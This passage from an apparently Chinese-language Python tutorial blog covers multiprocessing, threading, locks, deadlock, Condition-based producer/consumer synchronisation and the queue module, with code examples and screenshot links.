class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">PRIMES = [</span><br><span class="line">    <span class="number">112272535095293</span>,</span><br><span class="line">    <span class="number">112582705942171</span>,</span><br><span class="line">    <span class="number">1099726899285419</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> concurrent.futures.ProcessPoolExecutor() <span class="keyword">as</span> pool:</span><br><span class="line">        <span class="comment"># 提交给pool的是一个函数，如果是map，提交方法为pool.map</span></span><br><span class="line">        <span class="keyword">for</span> number, prime <span class="keyword">in</span> <span class="built_in">zip</span>(PRIMES, pool.<span class="built_in">map</span>(is_prime, PRIMES)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;%d is prime?%s&quot;</span>%(number, prime))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    start = time()</span><br><span class="line">    main()</span><br><span class="line">    end = time()</span><br><span class="line">    <span class="built_in">print</span>(end-start)</span><br></pre></td></tr></table></figure>
<p><strong>看结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649309808439.png"></p>
<p>不同的<strong>pool参数</strong>也会对运行效率有影响。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649309906898.png"><br>不一定是参数越大效率越高，因为会花费时间在进程切换上。<strong>一般参数&#x3D; 任务个数最好</strong></p>
<h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><blockquote>
<p>多个进程之间进行通信，数据的共享</p>
</blockquote>
<blockquote>
<p>一个例子理解多进程的空间：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_task</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">while</span> counter&lt;<span class="number">10</span>:</span><br><span class="line">        <span class="built_in">print</span>(string, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        counter+=<span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    Process(target=sub_task, args=(<span class="string">&quot;ping&quot;</span>, )).start()</span><br><span class="line">    Process(target=sub_task, args=(<span class="string">&quot;pong&quot;</span>, )).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649310473472.png"></p>
<p><strong>解释：</strong><br>在创建进程时每一个子进程都会复制父进程的数据，都会有一个单独的进程空间。所以counter是各个进程都有的，单独存在。</p>
<blockquote>
<p>使用Queue类来进行进程通信</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(%s)进程开始从队列传输数据：&quot;</span>%os.getpid())</span><br><span class="line">    q.put(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line"></span><br><span class="line">    p = Process(target=fun, args=(q, ))</span><br><span class="line">    p.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(%s)进程开始从队列读取数据：&quot;</span>%os.getpid())</span><br><span class="line">    <span class="built_in">print</span>(q.get())</span><br><span class="line">    p.join()</span><br></pre></td></tr></table></figure>
<p><strong>看结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649310886687.png"></p>
<blockquote>
<p>两个子进程之间的通信</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process,Queue</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(%s)进程开始从队列传输数据：&quot;</span>%os.getpid())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>]:</span><br><span class="line">        q.put(i)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;(%s)进程开始从队列读取数据：&quot;</span>%os.getpid())</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        i = q.get(<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Get %s from queue&quot;</span>%i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line"></span><br><span class="line">    p1 = Process(target=write, args=(q, ))</span><br><span class="line">    p2 = Process(target=read, args=(q, ))</span><br><span class="line">    p1.start()</span><br><span class="line">    p2.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p1.join()</span><br><span class="line">    p2.join()</span><br><span class="line">    <span class="comment"># 死循环，强制终止</span></span><br><span class="line">    p2.terminate()</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649311181213.png"></p>
<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h1><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648793139879.png"></p>
<h2 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h2><p><strong>模块介绍</strong>：<br><code>_Thread模块</code>：低级模块<br><code>threading模块</code>：高级模块，对_Thread模块进行了封装。</p>
<blockquote>
<p>模块基本功能（部分）</p>
</blockquote>
<ul>
<li>threading.<code>stack_size()</code>：返回当前线程大小</li>
<li>threading.<code>stack_size(xx)</code>：设置当前线程大小</li>
<li>threading.<code>active_count()</code>：查看存活线程数目</li>
<li>threading.<code>enumerate()</code>：枚举当前活动的线程，以列表形式返回</li>
<li>threading.<code>current_thread().name</code>：返回当前线程的名称</li>
</ul>
<p><strong>示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="built_in">print</span>(threading.stack_size())</span><br><span class="line">threading.stack_size(<span class="number">64</span>*<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(threading.stack_size())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(threading.active_count())</span><br><span class="line"><span class="built_in">print</span>(threading.<span class="built_in">enumerate</span>())</span><br><span class="line"><span class="built_in">print</span>(threading.current_thread().name)</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648795273877.png"></p>
<blockquote>
<p>创建线程的方法</p>
</blockquote>
<ol>
<li>使用threading模块的Threat类的构造方法创建线程，把一个函数传给target创建的Thread示例，再调用start方法启动线程</li>
<li>通过继承threading的Thread类创建进程</li>
</ol>
<blockquote>
<p>第一种方法：threading.Thread类创建</p>
</blockquote>
<p><strong>先来看一下Thread类的构造方法</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648795859357.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648795891498.png" alt="中文"></p>
<p><strong>代码实践</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Thread %s &gt;&gt;&gt; %s&quot;</span>%(threading.current_thread().name, i))</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s is runing...&quot;</span>%threading.current_thread().name)</span><br><span class="line">    t = threading.Thread(target=fun, args=(<span class="number">5</span>,), name=<span class="string">&quot;Thread_t&quot;</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    t.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br></pre></td></tr></table></figure>
<p><strong>运行截图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648796341414.png"></p>
<p><strong>注意事项</strong>：<br>1、在创建进程时传入<code>参数args</code>需要<strong>使用元组</strong>，如果是单子，要用<code>(xxx,)</code>形式<br>2、区分<code>threading</code>方法和<code>Thread</code>方法。</p>
<hr>
<p><strong>join方法解析</strong>：<br><code>t.join()</code>就是<strong>截断当前进程</strong>，当子线程运行完毕后才继续运行。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Thread %s &gt;&gt;&gt; %s&quot;</span>%(threading.current_thread().name, i))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s is runing...&quot;</span>%threading.current_thread().name)</span><br><span class="line">    t1 = threading.Thread(target=fun, args=(<span class="number">5</span>,), name=<span class="string">&quot;Thread_t1&quot;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2 = threading.Thread(target=fun, args=(<span class="number">5</span>,), name=<span class="string">&quot;Thread_t2&quot;</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    t2.join()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br></pre></td></tr></table></figure>
<p><strong>运行截图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648796767223.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fun</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Thread %s &gt;&gt;&gt; %s&quot;</span>%(threading.current_thread().name, i))</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s is runing...&quot;</span>%threading.current_thread().name)</span><br><span class="line">    t1 = threading.Thread(target=fun, args=(<span class="number">5</span>,), name=<span class="string">&quot;Thread_t1&quot;</span>)</span><br><span class="line">    t1.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2 = threading.Thread(target=fun, args=(<span class="number">5</span>,), name=<span class="string">&quot;Thread_t2&quot;</span>)</span><br><span class="line">    t2.start()</span><br><span class="line">    <span class="comment"># t2.join()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Thread %s ended&quot;</span>%threading.current_thread().name)</span><br></pre></td></tr></table></figure>
<p><strong>运行截图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648796935518.png"></p>
<p><strong>解释</strong>：<br>1、使用<code>t.join()</code>会其下的代码停止执行，对应<strong>线程执行完毕后</strong>再继续执行，见eg1。<br>2、如果不使用<code>join方法</code>就会使得多个线程共同执行（虽然还是一个时间执行一个，但是<strong>会在不同线程之间进行切换</strong>）见eg2。</p>
<blockquote>
<p>第二种方法：继承threading.Thread类</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">myThread</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, num, threadname</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(name = threadname)</span><br><span class="line">        self.__num = num</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="built_in">print</span>(self.__num)</span><br><span class="line"></span><br><span class="line">t = myThread(<span class="number">6</span>, <span class="string">&quot;myThread&quot;</span>)</span><br><span class="line">t.daemon = <span class="literal">True</span></span><br><span class="line">t.start()</span><br><span class="line">t.join()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;thread %s ended&quot;</span>%threading.current_thread().name)</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648797867333.png"></p>
<p><strong>注意事项</strong>：<br>1、继承方法创建进行本质上与第一种方法一致，不过可以在<strong>构造方法中设置需要的变量</strong>。<br>2、在定义构造方法时<strong>先使用父类构造方法</strong>，传入进程名。<br>3、重写子类的<code>run方法</code>实现功能的自定义。（<strong>注：第一种方法也是通过run方法执行传入的函数的</strong>）</p>
<h2 id="锁LOCK"><a href="#锁LOCK" class="headerlink" title="锁LOCK"></a>锁LOCK</h2><blockquote>
<p>定义引入</p>
</blockquote>
<p><strong>临界资源</strong>：因为多个线程共享资源，如果此资源<strong>被多个进程竞争使用</strong>，即为“<code>临界资源</code>”</p>
<p>而<strong>锁的存在</strong>就是为临界资源添加一个保护，防止资源混乱。</p>
<blockquote>
<p>一个经典例子：银行取钱</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">balance = <span class="number">100000000</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">draw_account</span>):</span><br><span class="line">    <span class="keyword">global</span> balance</span><br><span class="line">    <span class="keyword">if</span> balance &gt;= draw_account:</span><br><span class="line">        <span class="built_in">print</span>(threading.current_thread().name +<span class="string">&quot;取前成功，取出的钱数为：&quot;</span>+ <span class="built_in">str</span>(draw_account))</span><br><span class="line">        time.sleep(<span class="number">0.001</span>)</span><br><span class="line">        balance-=draw_account</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;余额：&quot;</span>, balance)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(threading.current_thread().name +<span class="string">&quot;取钱时余额不足&quot;</span>)</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=draw, name=<span class="string">&quot;甲&quot;</span>, args=(<span class="number">60000000</span>,))</span><br><span class="line">t2 = threading.Thread(target=draw, name=<span class="string">&quot;乙&quot;</span>, args=(<span class="number">60000000</span>,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648799876437.png"></p>
<p>可见，多个线程竞争balance这个临界资源，造成逻辑错误。<strong>其错误来源：甲取钱后输出信息，而后在balance数值未变时乙开始取钱。</strong></p>
<hr>
<blockquote>
<p>改进方法：锁</p>
</blockquote>
<p><strong>方法介绍</strong>：</p>
<p><strong>threading模块</strong>提供了<code>Lock\RLock</code>两个类，他们都提供了以下方法加锁和释放锁。</p>
<ul>
<li>x.<code>acquire(locking=True,timeout=-1)</code>方法：获取锁，timeout设置加锁多少秒</li>
<li>x.<code>release()</code>方法：释放锁</li>
</ul>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">balance = <span class="number">100000000</span></span><br><span class="line">lock = threading.Lock()  <span class="comment"># 创建一个锁</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">draw_account</span>):</span><br><span class="line">    <span class="keyword">global</span> balance</span><br><span class="line">    lock.acquire()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> balance &gt;= draw_account:</span><br><span class="line">            <span class="built_in">print</span>(threading.current_thread().name +<span class="string">&quot;取前成功，取出的钱数为：&quot;</span>+ <span class="built_in">str</span>(draw_account))</span><br><span class="line">            time.sleep(<span class="number">0.001</span>)</span><br><span class="line">            balance-=draw_account</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;余额：&quot;</span>, balance)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(threading.current_thread().name +<span class="string">&quot;取钱时余额不足&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line">t1 = threading.Thread(target=draw, name=<span class="string">&quot;甲&quot;</span>, args=(<span class="number">60000000</span>,))</span><br><span class="line">t2 = threading.Thread(target=draw, name=<span class="string">&quot;乙&quot;</span>, args=(<span class="number">60000000</span>,))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t1.join()</span><br><span class="line">t2.join()</span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>:<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648800374941.png"></p>
<p><strong>注意点</strong>：<br>1、在使用前要<strong>先创建一个锁</strong>，使用<code>Lock类</code>。<br>2、使用<code>try...finally...</code>进行锁的释放<br>3、锁会把<strong>临界资源空间</strong>锁定，释放后别的线程才可以进行访问。？？？？？？？？？？？？？</p>
<h2 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h2><blockquote>
<p>锁有优点，可以保证临界资源的安全性，但是也会造成死锁。</p>
</blockquote>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Account</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, _<span class="built_in">id</span>, balance, lock</span>):</span><br><span class="line">        self.<span class="built_in">id</span> = _<span class="built_in">id</span></span><br><span class="line">        self.balance = balance</span><br><span class="line">        self.lock = lock</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">withdraw</span>(<span class="params">self, mny</span>):</span><br><span class="line">        self.balance -= mny</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">deposit</span>(<span class="params">self, mny</span>):</span><br><span class="line">        self.balance += mny</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Trans</span>(<span class="params">_<span class="keyword">from</span>, to, mny</span>):</span><br><span class="line">    <span class="keyword">if</span> _<span class="keyword">from</span>.lock.acquire():</span><br><span class="line">        _<span class="keyword">from</span>.withdraw(mny)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wait lock...&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> to.lock.acquire():</span><br><span class="line">        to.deposit(mny)</span><br><span class="line">        to.release()</span><br><span class="line">    _<span class="keyword">from</span>.release()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;finish&quot;</span>)</span><br><span class="line">a = Account(<span class="string">&quot;甲&quot;</span>, <span class="number">1000</span>,threading.Lock())</span><br><span class="line">b = Account(<span class="string">&quot;乙&quot;</span>, <span class="number">1000</span>,threading.Lock())</span><br><span class="line">threading.Thread(target=Trans, args=(a, b, <span class="number">300</span>)).start()</span><br><span class="line">threading.Thread(target=Trans, args=(b, a, <span class="number">300</span>)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>看结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1648804784815.png"></p>
<p>可以在acquire方法时<strong>设置时间</strong>，超出某个规定时间后就会释放锁。</p>
<h1 id="线程通信"><a href="#线程通信" class="headerlink" title="线程通信"></a>线程通信</h1><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649499569891.png"></p>
<h2 id="Condition实现线程通信"><a href="#Condition实现线程通信" class="headerlink" title="Condition实现线程通信"></a>Condition实现线程通信</h2><blockquote>
<p>作用流程：实现变量同步</p>
</blockquote>
<ul>
<li>创建condition对象</li>
<li>通过acquire获取锁，然后判断一些条件<ul>
<li>若条件满足，处理后通过notify方法通知唤醒其他线程，其他处于wait的线程会重新判断条件</li>
<li>不满足条件，wait阻塞该线程。</li>
</ul>
</li>
<li>最后使用release释放锁</li>
</ul>
<blockquote>
<p>一个例子：生产者与消费者</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Producer</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, threadname</span>):</span><br><span class="line">        threading.Thread.__init__(self, name=threadname)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">with</span> con:</span><br><span class="line">                <span class="keyword">if</span> count &gt; <span class="number">100</span> :</span><br><span class="line">                    con.wait()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    count += <span class="number">50</span></span><br><span class="line">                    <span class="built_in">print</span>(self.name+<span class="string">&#x27;produce 50,count=&#x27;</span>+<span class="built_in">str</span>(count))</span><br><span class="line">                    con.notify()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Consumer</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, threadname</span>):</span><br><span class="line">        threading.Thread.__init__(self, name=threadname)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">global</span> count</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">with</span> con:</span><br><span class="line">                <span class="keyword">if</span> count &lt; <span class="number">100</span>:</span><br><span class="line">                    con.wait()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    count -= <span class="number">25</span></span><br><span class="line">                    <span class="built_in">print</span>(self.name + <span class="string">&#x27;consumer 25,count=&#x27;</span> + <span class="built_in">str</span>(count))</span><br><span class="line">                    con.notify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count=<span class="number">200</span></span><br><span class="line">con = threading.Condition()<span class="comment"># 创建condition对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        p = Producer(<span class="string">&quot;producer&quot;</span>)</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        c = Consumer(<span class="string">&quot;consumer&quot;</span>)</span><br><span class="line">        c.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649501634173.png"></p>
<p><strong>具体分析：</strong><br>Condition实现线程通信，其原理与锁类似，不过在具体实现生有所不同。在condition中加入了判别机制，当满足某些条件时获取锁，其余线程wait。并在每一次完成后唤醒其他线程。</p>
<p><strong>具体流程图</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649501777587.png"></p>
<h2 id="queue实现线程通信"><a href="#queue实现线程通信" class="headerlink" title="queue实现线程通信"></a>queue实现线程通信</h2><blockquote>
<p>模块整体介绍：</p>
</blockquote>
<p>queue模块下有<strong>三种队列类</strong>，分别如下:</p>
<ul>
<li>queue.<code>Queue</code>:先进先出FIFO的常规队列、</li>
<li>queue.<code>LifoQueue</code>:后进先出的队列</li>
<li>queue.<code>PriorityQueue</code>:优先级队列，优先级最小的先出队</li>
</ul>
<p>三种队列类提供的方法基本相同，下面以<code>queue.Queue类</code>为例:</p>
<ul>
<li><code>qsize(self)</code>:队列的实际大小</li>
<li><code>empty(self)</code>:判定队列空，空返回True,否则返回False</li>
<li><code>full(self)</code>:判定队列满，满返回True,否则返回False</li>
<li><code>put</code>(self, item, block&#x3D;True, timeout&#x3D;None):往队列中放入元素。如果队列满，block&#x3D;True (阻塞方式) ,则当前线程被阻塞;如果队列满，block&#x3D;False (非阻塞方式) ,则抛出异常queue.FULL</li>
<li><code>put nowait</code>(self, item):往队列放入元素，采用非阻塞方式</li>
<li><code>get</code>(self, block&#x3D;True, timeout&#x3D;None) :往队列中取出元素。如果队列空，block&#x3D;True (阻塞方式) ,则当前线程被阻塞;如果队列空，block&#x3D;False (非阻塞方式) ,则抛出异常queue.EMPTY</li>
<li><code>get nowait(self)</code>:往队列取出元素，采用非阻塞方式，</li>
<li><code>task_ done(self)</code>:前面的任务已经完成，用在队列的消费者线程中。<strong>get方法之后调用task_done方法告诉队列处理的任务完成了</strong>。</li>
<li><code>join(self)</code>:队列阻塞，直到队列中所有的元素都被处理完毕。</li>
</ul>
<blockquote>
<p>一个例子：</p>
</blockquote>
